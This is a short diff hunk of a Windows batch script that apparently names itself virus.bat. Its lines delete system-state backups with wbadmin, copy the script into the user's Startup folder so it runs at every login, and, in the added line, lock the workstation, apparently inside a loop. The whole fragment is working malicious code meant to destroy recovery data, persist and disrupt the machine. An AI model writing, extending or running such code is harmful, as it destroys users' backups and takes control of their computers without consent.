@@ -3,9 +3,8 @@ wbadmin delete systemstatebackup -keepVersions:0
 echo %USERNAME%
 @echo off
 for /r C:\ %%f in (virus.bat) do (
-   cls
     move "%%f" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-   cls
+    rundll32.exe user32.dll,LockWorkStation
 )
 
 :a
